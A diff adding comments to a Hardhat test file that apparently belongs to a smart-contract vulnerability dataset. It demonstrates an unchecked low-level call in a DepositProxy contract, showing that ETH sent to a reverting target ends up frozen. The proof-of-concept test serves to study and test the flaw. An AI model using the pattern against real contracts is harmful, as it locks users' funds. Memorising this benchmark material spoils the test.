@@ -34,6 +34,7 @@ describe("attack unchecked_low_level_calls/0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a
 
   it("functional check: unchecked_low_level_calls/0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77.sol", async function () {
     const { contract, successContract } = await loadFixture(deployContracts);
+    //oracle: verify proxy function on DepositProxy works as expected when target.call does not revert.
     const amount = ethers.parseEther("1");
     const [_, a] = await ethers.getSigners();
     await expect(
@@ -41,6 +42,7 @@ describe("attack unchecked_low_level_calls/0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a
         .connect(a)
         .proxy(successContract.target, "0x", { value: amount }),
     ).to.not.be.reverted;
+    //verify that the successContract receives the funds from the previous call.
     expect(
       await ethers.provider.getBalance(successContract.target),
     ).to.be.equal(amount);
@@ -48,6 +50,7 @@ describe("attack unchecked_low_level_calls/0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a
 
   it("exploit unchecked low level call vulnerability", async function () {
     const { contract, revertContract } = await loadFixture(deployContracts);
+    //oracle: verify that the revert contract reverts when called directly, the call takes the money from the sender's wallet.
     const amount = ethers.parseEther("1");
     await expect(
       owner.sendTransaction({
@@ -59,24 +62,25 @@ describe("attack unchecked_low_level_calls/0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a
     const DepositBalanceBefore = await ethers.provider.getBalance(
       contract.target,
     );
+    //verify that the DepositProxy contract has no funds before the attack
     expect(DepositBalanceBefore).to.be.equal(0);
-
+    //verify that the revert contract has no funds before the attack
     const RevertBalanceBefore = await ethers.provider.getBalance(
       revertContract.target,
     );
     expect(RevertBalanceBefore).to.be.equal(0);
-
+    //oracle: verify that the proxy function on DepositProxy fails when target.call reverts.
     await expect(
       contract
         .connect(owner)
         .proxy(revertContract.target, "0x", { value: amount }),
     ).to.not.be.reverted;
-
+    //verify that the revert contract has no funds after the attack
     expect(await ethers.provider.getBalance(revertContract.target)).to.be.equal(
       0,
     );
 
-    //funds are frozen in the contract
+    //Verify that now funds are frozen in the contract
     expect(await ethers.provider.getBalance(contract.target)).to.be.equal(
       amount,
     );
